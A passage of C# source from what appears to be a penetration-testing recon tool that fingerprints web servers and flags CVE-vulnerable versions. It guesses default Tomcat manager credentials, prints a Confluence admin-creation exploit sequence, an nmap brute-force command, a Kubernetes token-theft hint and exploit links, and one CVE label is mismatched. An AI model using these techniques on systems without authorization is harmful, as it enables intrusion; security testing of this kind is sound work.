                            }
                            else
                            {
                                Console.WriteLine("Nope - " + (int)proxyShellInfo.StatusCode);
                            }
                        }
                        Headers.Remove("Location");
                    }
                }
                else if (StatusCode == HttpStatusCode.NotFound)
                {
                    toReturn += "- Base page is a 404" + Environment.NewLine;
                }
                else if (StatusCode == HttpStatusCode.Forbidden)
                {
                    toReturn += "- Base page is Forbidden" + Environment.NewLine;
                }
                else if (StatusCode != HttpStatusCode.OK)
                {
                    try
                    {
                        toReturn += "- Weird Status Code: " + (int)StatusCode + " " + StatusCode + Environment.NewLine;
                    }
                    catch
                    {
                        toReturn += "- Fatally Unknown Status Code: " + " " + StatusCode + Environment.NewLine;
                    }
                    if (Headers != null && Headers.Location != null)
                    {
                        toReturn += "-> Location: " + Headers.Location + Environment.NewLine;
                        Headers.Remove("Location");
                    }
                }
            }

            // Page Title
            if (!string.IsNullOrEmpty(PageTitle))
            {
                PageTitle = PageTitle.Trim();
                toReturn += "- Page Title: " + PageTitle + Environment.NewLine;

                // Apache Tomcat
                if (PageTitle.StartsWith("Apache Tomcat"))
                {

                    // Sanitize URL
                    if (!URL.EndsWith("/"))
                    {
                        URL += "/";
                    }

                    // CVE's
                    // https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0232
                    /*
                        Apache Tomcat 9.0.0.M1 to 9.0.17
                        Apache Tomcat 8.5.0 to 8.5.39
                        Apache Tomcat 7.0.0 to 7.0.93
                    */
                    // https://nvd.nist.gov/vuln/detail/CVE-2017-7675
                    // In Apache Tomcat 9.0.0.M1 to 9.0.0.M21 and 8.5.0 to 8.5.15
                    if (PageTitle == "Apache Tomcat/9.0.17")
                    {
                        toReturn += "- " + "Apache Tomcat 9.0.17 Detected - Vulnerable to CVE-2019-0232!".Recolor(Color.Orange);
                    }

                    // Apache Tomcat Page
                    List<NetworkCredential> defaultTomcatCreds =
                    [
                        new("tomcat", "s3cret"),
                        new("tomcat", "tomcat"),
                        new("manager", "manager"),
                        new("manager", "tomcat"),
                        new("admin", ""),
                    ];

                    List<string> tomcatLoginPages = new List<string>();
                    string managerStatusURL = URL + "manager/status,Manager (Status)"; // Manager (Status)
                    tomcatLoginPages.Add(managerStatusURL);
                    string managerAppHTMLURL = URL + "manager/html,Manager App (HTML)"; // Manager App (HTML)
                    tomcatLoginPages.Add(managerAppHTMLURL);
                    string managerAppTextURL = URL + "manager/text,Manager App (Text)"; // Manager App (Text)
                    tomcatLoginPages.Add(managerAppTextURL);
                    string hostManagerURL = URL + "host-manager/html,Host Manager (HTML)"; // Host Manager (HTML)
                    tomcatLoginPages.Add(hostManagerURL);

                    foreach (string tomcatLoginPage in tomcatLoginPages)
                    {
                        string loginPage = tomcatLoginPage.Split(',')[0];
                        string friendlyName = tomcatLoginPage.Split(',')[1];
                        var pageInfo = Web.GetHTTPInfo(tomcatLoginPage);
                        if (pageInfo.StatusCode == HttpStatusCode.Unauthorized)
                        {
                            toReturn += $"- {friendlyName} - But it requires credentials --> {loginPage}" + Environment.NewLine;
                            try
                            {
                                // NetworkCredential defaultTomcatCreds = new("tomcat", "s3cret");
                                bool found = false;
                                foreach (var creds in defaultTomcatCreds)
                                {
                                    if (DownloadString(loginPage, Creds: creds).StatusCode != HttpStatusCode.Unauthorized)
                                    {
                                        found = true;
                                        toReturn += "-- " + $"Creds Found: {creds.UserName}:{creds.Password}".Recolor(Color.Orange) + Environment.NewLine;
                                        break;
                                    }
                                }
                                if (!found)
                                {
                                    toReturn += "-- No Creds found - You can try more over at: /auxiliary/scanner/http/tomcat_mgr_login" + Environment.NewLine;
                                }
                            }
                            catch
                            {
                                toReturn += "-- Default creds - tomcat:s3cret - don't work" + Environment.NewLine;
                            }
                        }
                        else if (pageInfo.StatusCode == HttpStatusCode.Forbidden)
                        {
                            toReturn += $"- {friendlyName} Found - But it's Forbidden" + Environment.NewLine;
                        }
                        else if (pageInfo.StatusCode != HttpStatusCode.NotFound)
                        {
                            toReturn += $"- Unknown {friendlyName} Status Code: " + pageInfo.StatusCode + Environment.NewLine;
                        }
                    }
                }
            }

            // DNS
            if (!string.IsNullOrEmpty(DNS))
            {
                toReturn += "- DNS: " + DNS + Environment.NewLine;
            }

            // Headers + Cookies!
            if (Headers.Any())
            {
                // Server info
                if (Headers.Any(x => x.Key == "Server"))
                {
                    string serverText = Headers.Server.ToString();
                    Headers.Remove("Server");
                    // Eg: Apache/2.4.46, (Win64), OpenSSL/1.1.1j, PHP/7.3.27
                    // Heartbleed - OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable
                    toReturn += "- Server: " + serverText + Environment.NewLine;

                    // Apache
                    if (serverText.StartsWith("Apache"))
                    {
                        toReturn += "-- " + "Apache Detected".Recolor(Color.Orange) + Environment.NewLine;
                        if (serverText.Contains("2.4.49") || serverText.Contains("2.4.50"))
                        {
                            toReturn += "--- " + "Version possible vulnerable to CVE-2021-41773 or CVE-2021-42013" + Environment.NewLine;
                            // TODO: Add better sources
                        }
                    }

                    else if (serverText.StartsWith("ATS/"))
                    {
                        toReturn += "-- ATS (Apache Traffic Server) Detected!" + Environment.NewLine;
                        string version = serverText.Remove(0, 4);
                        if (version == "7.1.1")
                        {
                            toReturn += "--- Vulnerable to CVE-2018–8004 - Request Smuggling - Oof :<" + Environment.NewLine;
                        }
                        else
                        {
                            toReturn += "-- If version versions 6.0.0 to 6.2.2 and 7.0.0 to 7.1.3. -> CVE-2018–8004 (Request Smuggling) - Oof :<" + Environment.NewLine;
                            toReturn += "-- If you see this, bug Reelix to fix the ATS version check" + Environment.NewLine;
                        }
                    }
                    // CouchDB
                    else if (serverText.StartsWith("CouchDB/"))
                    {
                        toReturn += "-- CouchDB Detected!" + Environment.NewLine;
                        var utilsPage = GetHTTPInfo($"{urlWithSlash}_utils/");
                        if (utilsPage.StatusCode == HttpStatusCode.OK || utilsPage.StatusCode == HttpStatusCode.NotModified)
                        {
                            toReturn += "--- " + $"Web Admin Tool Found: {utilsPage.URL}".Recolor(Color.Orange) + Environment.NewLine;
                        }
                        var allDBsPage = GetHTTPInfo($"{urlWithSlash}_all_dbs");
                        if (allDBsPage.StatusCode == HttpStatusCode.OK)
                        {
                            string allDBsPageText = allDBsPage.PageText.Trim(Environment.NewLine.ToCharArray());
                            toReturn += "--- " + $"All DBs Found ( {allDBsPage.URL} ) : {allDBsPageText}".Recolor(Color.Orange) + Environment.NewLine;
                            toReturn += $"--- Enumeration: {urlWithSlash}dbNameHere/_all_docs" + Environment.NewLine;
                            // ID or Key Name? They both seem to be the same in test scnearios...
                            toReturn += $"--- Enumeration: {urlWithSlash}dbNameHere/idHere" + Environment.NewLine;
                        }
                    }

                    // HFS
                    else if (serverText.StartsWith("HFS"))
                    {
                        toReturn += "-- HTTP File Server (HFS) Detected!" + Environment.NewLine;
                        if (serverText.Contains("HFS 2.3"))
                        {
                            toReturn += "--- " + "Version likely vulnerable to CVE-2014-6287 - https://www.exploit-db.com/raw/49584".Recolor(Color.Orange) + Environment.NewLine;
                        }
                    }

                    // lighttpd
                    else if (serverText.StartsWith("lighttpd"))
                    {
                        toReturn += "-- " + "lighttpd Detected" + Environment.NewLine;
                        toReturn += "-- If version is below 1.4.19, check https://www.exploit-db.com/exploits/31396 (CVE-2008-1270)" + Environment.NewLine;
                    }
                    else if (serverText.StartsWith("MiniServ/"))
                    {
                        toReturn += "-- " + "Webmin Server Detected".Recolor(Color.Orange) + Environment.NewLine;
                        if (serverText == "MiniServ/1.580")
                        {
                            toReturn += "--- " + "Version Likely vulnerable to CVE-2012-2982!!".Recolor(Color.Orange) + Environment.NewLine;
                            toReturn += "---- https://www.exploit-db.com/exploits/21851 (Metasploit)" + Environment.NewLine;
                            toReturn += "---- OR https://raw.githubusercontent.com/cd6629/CVE-2012-2982-Python-PoC/master/web.py" + Environment.NewLine;
                        }
                        // 1.890, 1.900-1.920 - http://www.webmin.com/changes.html
                        else if (serverText.StartsWith("MiniServ/1.890") || serverText.StartsWith("MiniServ/1.900") || serverText.StartsWith("MiniServ/1.910") || serverText.StartsWith("MiniServ/1.920"))
                        {
                            toReturn += "--- " + "Version Likely vulnerable to CVE-2019-15107!!".Recolor(Color.Orange) + Environment.NewLine;
                            toReturn += "---- git clone https://github.com/MuirlandOracle/CVE-2019-15107 OR https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/webmin_backdoor.rb" + Environment.NewLine;
                        }
                        // https://www.cybersecurity-help.cz/vdb/SB2019030801
                        // -> Webmin: 0.1 - 1.900
                        // --> 2019-9624
                        // ---> https://www.exploit-db.com/exploits/46201
                        // ----> Webmin <= Webmin 1.900 (<= ??)

                        // Webmin: 0.1 - 1.910
                        // -> CVE-2019-12840
                        // --> https://www.exploit-db.com/exploits/46984
                    }
                    else if (serverText.StartsWith("Werkzeug/"))
                    {
                        toReturn += "-- " + "Werkzeug Detected" + Environment.NewLine;
                        var consolePage = GetHTTPInfo($"{urlWithSlash}console");
                        if (consolePage.StatusCode != HttpStatusCode.NotFound)
                        {
                            if (consolePage.PageText.Contains("The console is locked and needs to be unlocked by entering the PIN."))
                            {
                                toReturn += "--- /console exists - But it needs a PIN" + Environment.NewLine;
                                toReturn += "--- If you get LFI - https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug" + Environment.NewLine;
                            }
                            else
                            {
                                toReturn += "--- /console exists - With no PIN!".Recolor(Color.Orange) + Environment.NewLine;
                                // import os; print(os.popen("whoami").read())
                                // __import__('os').popen('whoami').read();
                            }
                        }
                        else
                        {
                            toReturn += "--- No /console :(" + Environment.NewLine;
                        }
                    }
                }

                // So many X's....
                if (Headers.Any(x => x.Key.StartsWith("X-Generator")))
                {
                    string generator = Headers.GetValues("X-Generator").First();
                    Headers.Remove("X-Powered-By");
                    toReturn += "- X-Generator: " + generator + Environment.NewLine;

                    if (generator.StartsWith("Drupal"))
                    {
                        toReturn += "-- Drupal Detected" + Environment.NewLine;
                        // TODO: Do these in-code
                        toReturn += $"-- Possible Version Detection: curl -s {baseURL}/CHANGELOG.txt | grep -m2 \"\"" + Environment.NewLine;
                        // Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1
                        // Drupalgeddon - https://nvd.nist.gov/vuln/detail/cve-2018-7600
                        toReturn += $"-- Possible Version Detection 2: curl -s {baseURL}/ grep 'content=\"Drupal'" + Environment.NewLine;
                        toReturn += $"-- Content Discovery: {baseURL}/node/1 (2,3,4,etc.)" + Environment.NewLine;
                        toReturn += $"--- Run: droopescan scan drupal -u {baseURL}/ (pipx install droopescan)" + Environment.NewLine;
                    }
                }

                if (Headers.Any(x => x.Key == "X-Powered-By"))
                {
                    string poweredBy = Headers.GetValues("X-Powered-By").First();
                    Headers.Remove("X-Powered-By");
                    toReturn += "- X-Powered-By: " + poweredBy + Environment.NewLine;

                    if (poweredBy.Contains("PHP"))
                    {
                        toReturn += "-- PHP Detected" + Environment.NewLine;
                        if (poweredBy.Contains("/8.1.0-dev"))
                        {
                            toReturn += "--- " + "Vulnerable PHP Version (PHP/8.1.0-dev) Detected - https://www.exploit-db.com/raw/49933 <-----".Recolor(Color.Orange) + Environment.NewLine;
                        }
                    }
                    // JBoss
                    if (poweredBy.Contains("JBoss"))
                    {
                        toReturn += "-- " + "JBoss Detected - Run jexboss - https://github.com/joaomatosf/jexboss <-----".Recolor(Color.Orange) + Environment.NewLine;
                    }
                    // Strapi
                    else if (poweredBy == "Strapi <strapi.io>")
                    {
                        toReturn += "-- " + "Strapi detected".Recolor(Color.Orange) + Environment.NewLine;
                        var versionCheck = Web.GetHTTPInfo($"{URL.Trim('/')}/admin/init");
                        if (versionCheck.StatusCode == HttpStatusCode.OK)
                        {
                            string versionJson = versionCheck.PageText;
                            try
                            {
                                var versionData = JsonDocument.Parse(versionJson);
                                string versionText = versionData.RootElement.GetProperty("data").GetProperty("strapiVersion").GetString();
                                toReturn += "--- Version: " + versionText + Environment.NewLine;
                                if (versionText == "3.0.0-beta.17.4")
                                {
                                    // CVE-2019-18818, CVE-2019-19609
                                    toReturn += "---- " + "Vulnerable Version Detected (Unauthenticated RCE!) - Run https://www.exploit-db.com/exploits/50239".Recolor(Color.Orange) + Environment.NewLine;
                                }
                                else if (versionText == "3.0.0-beta.17.7")
                                {
                                    // CVE-2019-19609 (Auth'd)
                                    toReturn += "----" + "Vulnerable Version Detected (Authenticated RCE) - https://www.exploit-db.com/exploits/50238".Recolor(Color.Orange) + Environment.NewLine;
                                }
                                else
                                {
                                    toReturn += "---- Vulnerable if before 3.0.0-beta.17.8 - Bug Reelix!" + Environment.NewLine;
                                }
                            }
                            catch (Exception ex)
                            {
                                toReturn += "--- Error - Version isn't formatted correctly: " + ex.Message + Environment.NewLine;
                            }
                        }
                    }
                }

                // Confluence
                if (Headers.Any(x => x.Key == "X-Confluence-Request-Time"))
                {
                    toReturn += "-- " + "Confluence Detected".Recolor(Color.Orange) + Environment.NewLine;
                    toReturn += "--- Bug Reelix - https://nvd.nist.gov/vuln/detail/CVE-2023-22527";
                }

                // Elasticsearch
                if (Headers.Any(x => x.Key == "X-Found-Handling-Cluster") && Headers.Any(x => x.Key == "X-Found-Handling-Instance"))
                {
                    toReturn += "-- " + "Elasticsearch Detected".Recolor(Color.Orange) + Environment.NewLine;

                    // We could get the cluster / instance name if we really wanted, but no need really
                    Headers.Remove("X-Found-Handling-Cluster");
                    Headers.Remove("X-Found-Handling-Instance");
                }

                // Gitlab
                if (Headers.Any(x => x.Key == "X-Gitlab-Meta"))
                {
                    toReturn += "-- " + "Gitlab Detected".Recolor(Color.Orange) + Environment.NewLine;
                    var versionCheck = GetHTTPInfo($"{URL}assets/webpack/manifest.json");
                    if (versionCheck.StatusCode == HttpStatusCode.OK)
                    {
                        JsonDocument versionData = JsonDocument.Parse(versionCheck.PageText);
                        string hash = versionData.RootElement.GetProperty("hash").GetString();
                        toReturn += "-- " + $"Version Hash: {hash}".Recolor(Color.Orange) + Environment.NewLine;
                        toReturn += "-- " + "Search in: https://raw.githubusercontent.com/righel/gitlab-version-nse/main/gitlab_hashes.json".Recolor(Color.Orange) + Environment.NewLine;
                        toReturn += "--- " + "CVE-2021-22205: 11.9.0 to 13.8.7, 13.9.0 to 13.9.5, 13.10.0 to 13.10.2 (Inclusive)".Recolor(Color.Orange) + Environment.NewLine;
                        toReturn += "--- " + "CVE-2023-7028: 16.1 to 16.1.5, 16.2 to 16.2.8, 16.3 to 16.3.6, 16.4 to 16.4.4, 16.5 to 16.5.5, 16.6 to 16.6.3, 16.7 to 16.7.1 (Inclusive)".Recolor(Color.Orange) + Environment.NewLine;
                    }
                }

                // Influxdb
                if (Headers.Any(x => x.Key.StartsWith("X-Influxdb-Version")))
                {
                    toReturn += "- InfluxDB Detected".Recolor(Color.Orange) + Environment.NewLine;
                    string influxDBVersion = Headers.GetValues("X-Influxdb-Version").First();
                    Headers.Remove("X-Influxdb-Version");
                    toReturn += "- InfluxDB Detected - Version: " + influxDBVersion + Environment.NewLine;
                    Version theVersion = new Version(influxDBVersion);
                    if (theVersion <= new Version("1.3.0"))
                    {
                        toReturn += "-- " + "Possible Vulnerable Version Detected - https://www.komodosec.com/post/when-all-else-fails-find-a-0-day <-----".Recolor(Color.Orange) + Environment.NewLine;
                    }
                }

                // Kubernetes
                if (Headers.Any(x => x.Key.StartsWith("X-Kubernetes-")))
                {
                    Headers.Where(x => !x.Key.StartsWith("X-Kubernetes-"));
                    toReturn += "-- " + "Kubernetes Detected".Recolor(Color.Orange) + Environment.NewLine;
                    var versionCheck = GetHTTPInfo($"{URL}version");
                    if (versionCheck.StatusCode == HttpStatusCode.OK)
                    {
                        JsonDocument versionData = JsonDocument.Parse(versionCheck.PageText);
                        string major = versionData.RootElement.GetProperty("major").GetString();
                        string minor = versionData.RootElement.GetProperty("minor").GetString();
                        toReturn += "-- " + $"Version: {major}.{minor} (In /version)".Recolor(Color.Orange) + Environment.NewLine;
                    }
                    toReturn += "--- " + "Try get /run/secrets/kubernetes.io/serviceaccount/token" + Environment.NewLine;
                    toReturn += "--- " + "If you do, read: https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" + Environment.NewLine;

                }

                // Vercel
                if (Headers.Any(x => x.Key.StartsWith("X-Vercel-Id") || x.Key.StartsWith("X-Vercel-Cache")))
                {
                    toReturn += "-- " + "Vercel Detected".Recolor(Color.Orange) + Environment.NewLine;
                    Headers.Remove("X-Vercel-Id");
                    Headers.Remove("X-Vercel-Cache");
                }

                // Useless ones (For our purposes, anyways)
                // X-Matched-Path ?
                Headers.Remove("X-Content-Type-Options");
                Headers.Remove("X-Frame-Options");

                // All the rest
                while (Headers.Any(x => x.Key.StartsWith("X-")))
                {
                    var theHeader = Headers.First(x => x.Key.StartsWith("X-"));
                    string headerName = theHeader.Key;
                    string headerValues = string.Join(",", Headers.GetValues(headerName));
                    toReturn += $"- {headerName}: {headerValues}" + Environment.NewLine;
                    toReturn += "-- If you see this, bug Reelix for a useful X- Header" + Environment.NewLine;
                    Headers.Remove(theHeader.Key);
                }

                // Requires a login
                if (Headers.Any(x => x.Key == "WWW-Authenticate"))
                {
                    string wwwAuthenticate = Headers.WwwAuthenticate.ToString();
                    Headers.Remove("WWW-Authenticate");
                    toReturn += $"- WWW-Authenticate: {wwwAuthenticate}" + Environment.NewLine;
                }

                // Kabana
                if (Headers.Any(x => x.Key == "kbn-name"))
                {
                    string kbnName = Headers.GetValues("kbn-name").First();
                    Headers.Remove("kbn-name");
                    toReturn += "- kbn-name: " + kbnName + Environment.NewLine;
                    toReturn += "-- You should get more kibana-based info further down" + Environment.NewLine;
                }
                if (Headers.Any(x => x.Key == "kbn-version"))
                {
                    string kbnVersion = Headers.GetValues("kbn-version").ToString(); // Will this bug since it's not .First() ?
                    Headers.Remove("kbn-version");
                    toReturn += $"- kbn-version: {kbnVersion}" + Environment.NewLine;
                }

                // Useful cookies
                if (Headers.Any(x => x.Key == "Set-Cookie"))
                {
                    string setCookie = Headers.GetValues("Set-Cookie").First();
                    Headers.Remove("Set-Cookie");
                    toReturn += $"- Set-Cookie: {setCookie}" + Environment.NewLine;
                    // Cacti
                    if (setCookie.StartsWith("Cacti"))
                    {
                        toReturn += "- " + "Cacti detected".Recolor(Color.Orange) + Environment.NewLine;
                        if (PageText.Contains("Version 1.2.22"))
                        {
                            toReturn += "-- " + "Vulnerable version 1.2.22 detected - CVE-2022-46169" + Environment.NewLine; ;
                        }
                        else
                        {
                            toReturn += "-- Unknown Cacti version - Bug Reelix" + Environment.NewLine;
                        }
                    }
                    // CuteNews Cookie
                    else if (setCookie.StartsWith("CUTENEWS_SESSION"))
                    {
                        toReturn += "-- " + $"CuteNews Found".Recolor(Color.Orange) + Environment.NewLine;
                        toReturn += $"--- " + $"Browse to {urlWithSlash}CuteNews/index.php".Recolor(Color.Orange) + Environment.NewLine;
                    }
                    // Moodle Cookie
                    else if (setCookie.StartsWith("MoodleSession"))
                    {
                        toReturn += "-- " + $"Moodle Found".Recolor(Color.Orange) + Environment.NewLine;
                        toReturn += $"--- " + $"Browse to {urlWithSlash}lib/upgrade.txt".Recolor(Color.Orange) + Environment.NewLine;
                        toReturn += "--- If 3.9 -> https://www.exploit-db.com/exploits/50180" + Environment.NewLine;
                    }
                }
                // Fun content types
                if (Headers.Any(x => x.Key == "Content-Type"))
                {
                    string contentType = Headers.GetValues("Content-Type").First();
                    if (contentType.StartsWith("text/html"))
                    {
                        // Skip it
                    }
                    else if (contentType.StartsWith("image"))
                    {
                        // The entire thing is an image - It's special!
                        toReturn += "- Content Type: " + contentType.Recolor(Color.Orange) + " <--- It's an image!" + Environment.NewLine;
                    }
                    else
                    {
                        // A unique content type - Might be interesting
                        toReturn += $"- Content-Type: {contentType}" + Environment.NewLine;
                    }
                }

                // CSP (Rules, Bypsses, etc.)
                if (Headers.Any(x => x.Key == "Content-Security-Policy"))
                {
                    string csp = Headers.GetValues("Content-Security-Policy").First();
                    toReturn += "- Content-Security-Policy: " + csp + Environment.NewLine;
                    toReturn += "-- Verify security with: https://csp-evaluator.withgoogle.com/" + Environment.NewLine;
                }

                // And the rest
                string otherHeaders = "";
                foreach (var header in Headers)
                {
                    otherHeaders += header.Key + ",";
                }
                otherHeaders = otherHeaders.Trim(',');
                toReturn += "- Other Headers: " + otherHeaders + Environment.NewLine;
            }

            // Page Text (Body)
            if (PageText.Length > 0)
            {
                if (PageText.Length < 250)
                {
                    toReturn += "- Page Text: " + PageText.Trim() + Environment.NewLine;
                }

                // Generic <meta name="generator" 
                if (PageText.Contains("<meta name=\"generator\" content="))
                {
                    string contentValue = PageText.Remove(0, PageText.IndexOf("<meta name=\"generator\" content=\"") + "<meta name=\"generator\" content=\"".Length);
                    contentValue = contentValue.Substring(0, contentValue.IndexOf("\"")).Trim();
                    if (contentValue.StartsWith("concrete5 - "))
                    {
                        toReturn += "- " + "concrete5 CMS detected!".Recolor(Color.Orange) + Environment.NewLine;
                        // <meta name="generator" content="concrete5 - 8.5.2"/>
                        string versionInfo = PageText.Remove(0, PageText.IndexOf("<meta name=\"generator\" content=\"concrete5 - "));
                        versionInfo = versionInfo.Remove(0, versionInfo.IndexOf("concrete5 - ") + 12);
                        versionInfo = versionInfo.Substring(0, versionInfo.IndexOf("\""));
                        toReturn += "-- Version: " + versionInfo + Environment.NewLine;
                        if (versionInfo == "8.5.2")
                        {
                            toReturn += "---" + " Vulnerable version detected - Vulnerable to CVE-2020-24986 - https://hackerone.com/reports/768322".Recolor(Color.Orange) + Environment.NewLine;
                        }
                    }
                    else if (contentValue.StartsWith("TYPO3"))
                    {
                        toReturn += "- " + "TYPO3 CMS detected!".Recolor(Color.Orange) + Environment.NewLine;
                        toReturn += "$-- check out /typo3temp, /typo3, and /typo3conf" + Environment.NewLine;
                        toReturn += $"-- git clone https://github.com/whoot/Typo3Scan && python3 typo3scan.py -d {urlPrefix}" + Environment.NewLine;
                    }
                    else if (contentValue.StartsWith("WordPress "))
                    {

                    }
                    else if (!contentValue.StartsWith("WordPress ")) // WordPress is more thoroughly checked further down
                    {
                        toReturn += "- " + (contentValue + " detected!").Recolor(Color.Orange) + Environment.NewLine;
                    }
                }

                // Confluence
                if (PageText.Contains("Printed by Atlassian Confluence") || PageText.Contains("Powered by Atlassian Confluence"))
                {
                    toReturn += "- " + "Confluence detected!".Recolor(Color.Orange) + Environment.NewLine;
                    toReturn += "-- " + "See if you can access /setup/".Recolor(Color.Orange) + Environment.NewLine; // Maybe automate this?
                                                                                                                        // Get the version
                    string confluenceVersionText = "";
                    if (PageText.Contains("Printed by Atlassian Confluence "))
                    {
                        string footerText = "Printed by Atlassian Confluence ";
                        confluenceVersionText = PageText.Remove(0, PageText.IndexOf(footerText) + footerText.Length);
                    }
                    else if (PageText.Contains("Powered By Atlassian Confluence "))
                    {
                        Console.WriteLine("Conf - 1");
                        string footerText = "Powered By Atlassian Confluence ";
                        confluenceVersionText = PageText.Remove(0, PageText.IndexOf(footerText) + footerText.Length);
                    }
                    confluenceVersionText = confluenceVersionText.Substring(0, confluenceVersionText.IndexOf("</li>"));
                    toReturn += $"-- Found Version: {confluenceVersionText}" + Environment.NewLine;
                    Version version = Version.Parse(confluenceVersionText);

                    // Check the version against some CVE's

                    // CVE-2022-26134 (Version on the right is fixed)
                    // 1.3.0 -> 7.4.17
                    // 7.13.0 -> 7.13.7
                    // 7.14.0 -> 7.14.3 
                    // 7.15.0 -> 7.15.2 
                    // 7.16.0 -> 7.16.4
                    // 7.17.0 -> 7.17.4
                    // 7.18.0 -> 7.18.1 
                    bool isVulnerable = false;
                    if (version >= Version.Parse("1.3.0") && version < Version.Parse("7.4.17"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("7.13.0") && version < Version.Parse("7.13.7"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("7.14.0") && version < Version.Parse("7.14.3"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("7.15.0") && version < Version.Parse("7.15.2"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("7.16.0") && version < Version.Parse("7.16.4"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("7.17.0") && version < Version.Parse("7.17.4"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("7.18.0") && version < Version.Parse("7.18.1"))
                    {
                        isVulnerable = true;
                    }

                    if (isVulnerable)
                    {
                        toReturn += "-- " + $"Vulnerable Confluence Version Detected {confluenceVersionText} -> https://github.com/Nwqda/CVE-2022-26134".Recolor(Color.Orange) + Environment.NewLine;
                    }
                    isVulnerable = false;

                    // CVE-2023-22515
                    // Ref: https://confluence.atlassian.com/kb/faq-for-cve-2023-22515-1295682188.html
                    if (version >= Version.Parse("8.0.0") && version < Version.Parse("8.0.4"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("8.1.0") && version < Version.Parse("8.1.5"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("8.2.0") && version < Version.Parse("8.2.4"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("8.3.0") && version < Version.Parse("8.3.3"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("8.4.0") && version < Version.Parse("8.4.3"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("8.5.0") && version < Version.Parse("8.5.2"))
                    {
                        isVulnerable = true;
                    }

                    if (isVulnerable)
                    {
                        // Ref: https://tryhackme.com/room/confluence202322515
                        toReturn += "-- " + $"Vulnerable Confluence Version Detected {confluenceVersionText} (CVE-2022-26134)".Recolor(Color.Orange) + Environment.NewLine;
                        toReturn += "--- " + $"1.) Proceed to {baseURL}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false".Recolor(Color.Orange) + Environment.NewLine;
                        toReturn += "--- " + $"2.) Proceed to {baseURL}/setup/setupadministrator-start.action and create a new admin user (Choose Different username).".Recolor(Color.Orange) + Environment.NewLine;
                    }
                    isVulnerable = false;

                    // CVE-2023-22518
                    // Ref: https://confluence.atlassian.com/security/cve-2023-22518-improper-authorization-vulnerability-in-confluence-data-center-and-server-1311473907.html
                    if (version >= Version.Parse("7.0.0") && version < Version.Parse("7.19.16"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("8.3.0") && version < Version.Parse("8.3.4"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("8.4.0") && version < Version.Parse("8.4.4"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("8.5.0") && version < Version.Parse("8.5.3"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("8.6.0") && version < Version.Parse("8.6.1"))
                    {
                        isVulnerable = true;
                    }

                    if (isVulnerable)
                    {
                        // Ref: https://tryhackme.com/room/confluence202322515
                        toReturn += "-- " + $"Vulnerable Confluence Version Detected {confluenceVersionText} (CVE-2023-22518)".Recolor(Color.Orange) + Environment.NewLine;
                        toReturn += "--- No PoC yet - Check Github maybe." + Environment.NewLine;
                    }

                }

                // Gitea
                // Cookie Added Name: i_like_gitea
                if (PageText.Contains("Powered by Gitea"))
                {
                    toReturn += "- " + "Gitea detected!".Recolor(Color.Orange) + Environment.NewLine;
                    if (PageText.ToLower().Contains("appver: '") && PageText.ToLower().Contains("appsuburl: '")) // appUrl
                    {
                        string giteaVersion = PageText.Remove(0, PageText.ToLower().IndexOf("appver: '".ToLower()) + 9);
                        giteaVersion = giteaVersion.Substring(0, giteaVersion.IndexOf("'"));
                        Version theVersion = System.Version.Parse(giteaVersion);
                        toReturn += $"-- Version: {theVersion}".Recolor(Color.White) + Environment.NewLine;
                        // Version: >= 1.1.0 to <= 1.12.5
                        if (theVersion.Major == 1 && theVersion.Minor <= 12)
                        {
                            toReturn += "-- " + $"Vulnerable Gitea Version Detected {giteaVersion} -> https://www.exploit-db.com/raw/49571".Recolor(Color.Orange) + Environment.NewLine;
                        }
                        toReturn += "-- If you gain access, see if you can alter gitea.db (User table)".Recolor(Color.White) + Environment.NewLine;
                    }
                }

                // Grafana
                if (PageText.Contains("Grafana v")) // ,"subTitle":"Grafana v8.3.0 (914fcedb72)"
                {
                    toReturn += "- " + "Grafana detected!".Recolor(Color.Orange) + Environment.NewLine;
                    string grafanaVersion = PageText.Remove(0, PageText.IndexOf("Grafana v") + 8);
                    grafanaVersion = grafanaVersion.Substring(0, grafanaVersion.IndexOf("\""));
                    toReturn += "-- Version: " + grafanaVersion + Environment.NewLine;
                    if (grafanaVersion.Contains("v8."))
                    {
                        toReturn += "--- " + "Possibly vulnerable to CVE-2021-43798 (Grafana versions 8.0.0-beta1 through 8.3.0)".Recolor(Color.Orange) + Environment.NewLine;
                        toReturn += "--- " + "Exploit: https://github.com/taythebot/CVE-2021-43798" + Environment.NewLine;
                    }
                }

                // Icecast
                if (PageText.Trim() == "<b>The source you requested could not be found.</b>")
                {
                    toReturn += "-- Possible Icecast Server detected" + Environment.NewLine; // Thanks nmap!
                    toReturn += "-- Try: run Metasploit windows/http/icecast_header" + Environment.NewLine;
                }

                // Joomla!
                if (PageText.Contains("com_content") && PageText.Contains("com_users"))
                {
                    toReturn += "- " + "Joomla! Detected".Recolor(Color.Orange) + Environment.NewLine;
                    toReturn += "- " + $"Brute Force: nmap -p80 -sV --script http-joomla-brute {DNS} --script-args 'userdb=users.txt,passdb=words.txt,http-joomla-brute.uri=/administrator/index.php'".Recolor(Color.Orange);
                    var adminXML = GetHTTPInfo($"{URL}administrator/manifests/files/joomla.xml");
                    if (adminXML.StatusCode == HttpStatusCode.OK)
                    {
                        if (adminXML.PageText.Contains("<version>") && adminXML.PageText.Contains("</version>"))
                        {
